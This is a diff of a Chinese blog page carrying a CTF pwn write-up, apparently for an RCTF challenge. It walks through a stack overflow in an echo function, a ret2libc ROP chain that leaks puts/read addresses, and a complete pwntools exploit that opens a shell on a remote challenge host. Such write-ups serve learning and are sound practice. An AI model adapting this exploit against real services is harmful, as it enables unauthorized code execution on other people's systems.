@@ -6,10 +6,14 @@
     <meta charset="utf-8">
     <meta name="keywords" content="libc64, shellcode等">
     <meta name="description" content="checksec
-![屏幕截图 2025-01-16 114726](C:\Users\33942\Pictures\Screenshots\屏幕截图 2025-01-16 114726.png)
+
 NX保护开启
 IDA64分析
-![屏幕截图">
+
+可以发现main函数没有什么问题，进入echo函数查看
+
+可以发现echo函数存在漏洞，s2数组只有16字节，而传入的buf可以为1024字节，存在栈溢出漏洞。
+该函数循环遇到0就会停止，">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -395,7 +399,7 @@ IDA64分析
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    648
+                    472
                 </div>
                 
 
@@ -418,31 +422,31 @@ IDA64分析
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <p><strong>checksec</strong></p>
-<p>![屏幕截图 2025-01-16 114726](C:\Users\33942\Pictures\Screenshots\屏幕截图 2025-01-16 114726.png)</p>
+<p><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-16%20114726.png" alt="屏幕截图 2025-01-16 114726"></p>
 <p>NX保护开启</p>
 <p><strong>IDA64分析</strong></p>
-<p>![屏幕截图 2025-01-16 114845](C:\Users\33942\Pictures\Screenshots\屏幕截图 2025-01-16 114845.png)</p>
+<p><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-16%20114845.png" alt="屏幕截图 2025-01-16 114845"></p>
 <p>可以发现main函数没有什么问题，进入echo函数查看</p>
-<p>![屏幕截图 2025-01-16 114858](C:\Users\33942\Pictures\Screenshots\屏幕截图 2025-01-16 114858.png)</p>
+<p><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-16%20114858.png" alt="屏幕截图 2025-01-16 114858"></p>
 <p>可以发现echo函数存在漏洞，s2数组只有16字节，而传入的buf可以为1024字节，存在栈溢出漏洞。</p>
 <p>该函数循环遇到0就会停止，可以构造ROP链。</p>
 <p><strong>解题</strong></p>
-<p>F12查看![屏幕截图 2025-01-16 114953](C:\Users\33942\Pictures\Screenshots\屏幕截图 2025-01-16 114953.png)</p>
+<p>F12查看<img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-16%20114953.png" alt="屏幕截图 2025-01-16 114953"></p>
 <p>没有发现system和/bin/sh，可以通过泄漏puts或read函数真实地址，构造getshell。</p>
-<p>![屏幕截图 2025-01-16 175133](C:\Users\33942\Pictures\Screenshots\屏幕截图 2025-01-16 175133.png)</p>
+<p><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-16%20175133.png" alt="屏幕截图 2025-01-16 175133"></p>
 <p>64位Linux前六个参数是使用rdi,rsi,rdx,rcs,r8,r9传递的，需要构造两个payload，而且要先pop四次，payload1=’a’*0x18+p64(pop_4)+p64(ROP);</p>
-<p>![屏幕截图 2025-01-16 162420](C:\Users\33942\Pictures\Screenshots\屏幕截图 2025-01-16 162420.png)</p>
+<p><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-16%20162420.png" alt="屏幕截图 2025-01-16 162420"></p>
 <p>通过泄露puts和read真实地址寻找libc版本，脚本如下：</p>
 <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(os = 'linux', arch = 'amd64', log_level = 'debug')</span><br><span class="line"></span><br><span class="line">r = remote('61.147.171.105',63071)</span><br><span class="line">elf = ELF('./7eff')</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt['puts']</span><br><span class="line">puts_got = elf.got['read']</span><br><span class="line">main_addr = elf.symbols['main']</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = 0x4008a3</span><br><span class="line">pop_4 = 0x40089c</span><br><span class="line"></span><br><span class="line">payload = b'a' * (0x18) + p64(pop_4) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">r.sendlineafter('RCTF\n',payload)</span><br><span class="line"></span><br><span class="line">puts_real_addr = u64(r.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))</span><br><span class="line"></span><br><span class="line">print("puts_real_addr:",hex(puts_real_addr))</span><br></pre></td></tr></tbody></table></figure>
 
 <p>把read改为puts，就可以得到puts的真实地址。read和puts的真实地址是变化的，但后三位是不变的，根据其可以筛选出libc版本，并将其下载。</p>
-<p>![屏幕截图 2025-01-16 170856](C:\Users\33942\Pictures\Screenshots\屏幕截图 2025-01-16 170856.png)我们可以通过puts真实地址-偏移得到libc的基地址，从而可以计算出system和/bin/sh,进而构造payload2 = b’a’ * (0x18) + p64(pop_4) + p64(pop_rdi_ret) + p64(binsh_addr)+p64(system_addr)</p>
+<p><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-16%20170856.png" alt="屏幕截图 2025-01-16 170856">我们可以通过puts真实地址-偏移得到libc的基地址，从而可以计算出system和/bin/sh,进而构造payload2 = b’a’ * (0x18) + p64(pop_4) + p64(pop_rdi_ret) + p64(binsh_addr)+p64(system_addr)</p>
 <p>最终的exp：</p>
 <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">context(os = 'linux', arch = 'amd64', log_level = 'debug')</span><br><span class="line"></span><br><span class="line">r = remote('61.147.171.105',63071)</span><br><span class="line">elf = ELF('./7eff')</span><br><span class="line">libc = ELF('./libc6_2.23-0ubuntu11_amd64.so')</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt['puts']</span><br><span class="line">puts_got = elf.got['read']</span><br><span class="line">main_addr = elf.symbols['main']</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = 0x4008a3</span><br><span class="line">pop_4 = 0x40089c</span><br><span class="line">#ret = 0x400589</span><br><span class="line"></span><br><span class="line">payload = b'a' * (0x18) + p64(pop_4) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">r.sendlineafter('RCTF\n',payload)</span><br><span class="line"></span><br><span class="line">puts_real_addr = u64(r.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))</span><br><span class="line"></span><br><span class="line">print("puts_real_addr:",hex(puts_real_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_real_addr - libc.symbols['read']</span><br><span class="line">print(hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols['system']</span><br><span class="line">binsh_addr = libc_base + next(libc.search('/bin/sh'))</span><br><span class="line"></span><br><span class="line">payload1 = b'a' * (0x18) + p64(pop_4) + p64(pop_rdi_ret) + p64(binsh_addr)+p64(system_addr)</span><br><span class="line"></span><br><span class="line">r.sendline(payload1)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>
 
 
 
-<p>![屏幕截图 2025-01-16 171231](C:\Users\33942\Pictures\Screenshots\屏幕截图 2025-01-16 171231.png)</p>
+<p><img src="/imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-16%20171231.png" alt="屏幕截图 2025-01-16 171231"></p>
 <p><strong>堆栈平衡</strong></p>
 <p>用ROP链找到ret，然后在填充垃圾数据后加上p64(ret)</p>
 
